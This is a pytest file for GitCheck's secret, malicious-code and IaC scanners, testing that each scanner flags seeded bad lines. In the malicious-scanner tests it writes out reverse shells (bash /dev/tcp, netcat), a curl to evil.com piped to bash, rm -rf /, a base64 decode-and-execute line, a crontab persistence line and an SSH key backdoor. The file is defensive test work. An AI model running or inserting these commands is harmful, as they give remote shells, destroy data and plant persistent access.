"""
Adversarial / Red-team test scenarios for GitCheck scanners.

Every test injects a REAL malicious payload and asserts the scanner
flags it. If the scanner misses it → test FAILS with a clear alert.
"""

import pytest
from analysis.secret_scanner import scan_for_secrets
from analysis.malicious_scanner import scan_for_malicious
from analysis.iac_scanner import scan_for_iac


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _alert(scanner: str, payload: str, findings: list):
    """Returns a readable failure message when a scanner misses a payload."""
    return (
        f"\n🚨 SECURITY ALERT — {scanner} MISSED A MALICIOUS PAYLOAD!\n"
        f"   Payload : {payload!r}\n"
        f"   Findings: {findings}\n"
        f"   Fix     : Update the rule in the corresponding compliance JSON.\n"
    )


# ─────────────────────────────────────────────────────────────────────────────
# SECRET SCANNER — should catch these
# ─────────────────────────────────────────────────────────────────────────────

class TestSecretScanner:

    def test_aws_access_key_leaked(self, mock_diff_chunk):
        """AWS key hardcoded in source → MUST be caught."""
        payload = "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'"
        chunk = mock_diff_chunk(file_path="config.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)
        assert "HIGH" in findings[0] or "CRITICAL" in findings[0]

    def test_rsa_private_key_committed(self, mock_diff_chunk):
        """RSA private key block in code → MUST be caught."""
        payload = "-----BEGIN RSA PRIVATE KEY-----"
        chunk = mock_diff_chunk(file_path="deploy.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_hardcoded_password_assignment(self, mock_diff_chunk):
        """password = 'superSecret123xyz' → MUST be caught."""
        payload = "password = 'superSecret123xyz'"
        chunk = mock_diff_chunk(file_path="db.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)

    def test_ssn_in_mock_data(self, mock_diff_chunk):
        """Social security number in test fixture → MUST be caught."""
        payload = 'user = {"ssn": "123-45-6789", "name": "John"}'
        chunk = mock_diff_chunk(file_path="fixtures.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)
        assert "HIGH" in findings[0]

    def test_internal_ip_hardcoded(self, mock_diff_chunk):
        """Internal IP in source (SSRF risk) → MUST be caught."""
        payload = "DB_HOST = '192.168.1.100'"
        chunk = mock_diff_chunk(file_path="settings.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)

    def test_slack_bot_token_leaked(self, mock_diff_chunk):
        """Slack bot token hardcoded → MUST be caught."""
        # payload = "SLACK_TOKEN = 'jkbhjbhjbhjbhj'"
        payload = "SLACK_TOKEN = 'jhbhjbhjbhj'"
        chunk = mock_diff_chunk(file_path="notify.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) > 0, _alert("SecretScanner", payload, findings)

    def test_safe_print_not_flagged(self, mock_diff_chunk):
        """Benign line must NOT produce false positives."""
        payload = "print('hello world')"
        chunk = mock_diff_chunk(file_path="main.py", added_lines=[payload])
        findings = scan_for_secrets(chunk)
        assert len(findings) == 0, (
            f"⚠️  FALSE POSITIVE — SecretScanner flagged a safe line!\n"
            f"   Line    : {payload!r}\n"
            f"   Findings: {findings}\n"
        )


# ─────────────────────────────────────────────────────────────────────────────
# MALICIOUS SCANNER — should catch these attack patterns
# ─────────────────────────────────────────────────────────────────────────────

class TestMaliciousScanner:

    def test_reverse_shell_bash(self, mock_diff_chunk):
        """Classic bash reverse shell → MUST be caught."""
        payload = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        chunk = mock_diff_chunk(file_path="setup.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_reverse_shell_netcat(self, mock_diff_chunk):
        """Netcat reverse shell → MUST be caught."""
        payload = "nc -e /bin/bash 10.10.10.10 9001"
        chunk = mock_diff_chunk(file_path="entrypoint.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_curl_pipe_to_bash(self, mock_diff_chunk):
        """Downloading and executing remote script → MUST be caught."""
        payload = "curl https://evil.com/exploit.sh | bash"
        chunk = mock_diff_chunk(file_path="install.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)

    def test_destructive_rm_rf(self, mock_diff_chunk):
        """rm -rf / wipe command → MUST be caught."""
        payload = "rm -rf /"
        chunk = mock_diff_chunk(file_path="cleanup.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_base64_obfuscated_payload(self, mock_diff_chunk):
        """Base64 decode-and-execute obfuscation → MUST be caught."""
        payload = "echo SGVsbG8gV29ybGQ= | base64 -d | bash"
        chunk = mock_diff_chunk(file_path="run.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)

    def test_cron_persistence(self, mock_diff_chunk):
        """Writing to /etc/crontab for persistence → MUST be caught."""
        payload = "echo '* * * * * root curl evil.com | bash' >> /etc/crontab"
        chunk = mock_diff_chunk(file_path="post_install.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)

    def test_ssh_backdoor(self, mock_diff_chunk):
        """Injecting SSH key into authorized_keys → MUST be caught."""
        payload = "echo 'ssh-rsa AAAAB3Nza...' >> /root/.ssh/authorized_keys"
        chunk = mock_diff_chunk(file_path="bootstrap.sh", added_lines=[payload])
        findings = scan_for_malicious(chunk)
        assert len(findings) > 0, _alert("MaliciousScanner", payload, findings)
        assert "CRITICAL" in findings[0]


# ─────────────────────────────────────────────────────────────────────────────
# IAC SCANNER — Terraform & Kubernetes misconfigs
# ─────────────────────────────────────────────────────────────────────────────

class TestIaCScanner:

    def test_public_s3_bucket(self, mock_diff_chunk):
        """Terraform S3 with public-read ACL → MUST be caught."""
        payload = '  acl = "public-read"'
        chunk = mock_diff_chunk(file_path="main.tf", added_lines=[payload])
        findings = scan_for_iac(chunk)
        assert len(findings) > 0, _alert("IaCScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_open_security_group(self, mock_diff_chunk):
        """Terraform SG open to 0.0.0.0/0 → MUST be caught."""
        payload = '  cidr_blocks = ["0.0.0.0/0"]'
        chunk = mock_diff_chunk(file_path="network.tf", added_lines=[payload])
        findings = scan_for_iac(chunk)
        assert len(findings) > 0, _alert("IaCScanner", payload, findings)

    def test_privileged_kubernetes_pod(self, mock_diff_chunk):
        """K8s pod with privileged: true → MUST be caught."""
        payload = "          privileged: true"
        chunk = mock_diff_chunk(file_path="deployment.yaml", added_lines=[payload])
        findings = scan_for_iac(chunk)
        assert len(findings) > 0, _alert("IaCScanner", payload, findings)
        assert "CRITICAL" in findings[0]

    def test_kubernetes_root_user(self, mock_diff_chunk):
        """K8s pod running as root (uid 0) → MUST be caught."""
        payload = "          runAsUser: 0"
        chunk = mock_diff_chunk(file_path="pod.yaml", added_lines=[payload])
        findings = scan_for_iac(chunk)
        assert len(findings) > 0, _alert("IaCScanner", payload, findings)

    def test_safe_terraform_private_bucket(self, mock_diff_chunk):
        """Private bucket ACL must NOT trigger a false positive."""
        payload = '  acl = "private"'
        chunk = mock_diff_chunk(file_path="main.tf", added_lines=[payload])
        findings = scan_for_iac(chunk)
        assert len(findings) == 0, (
            f"⚠️  FALSE POSITIVE — IaCScanner flagged a safe Terraform line!\n"
            f"   Line    : {payload!r}\n"
            f"   Findings: {findings}\n"
        )
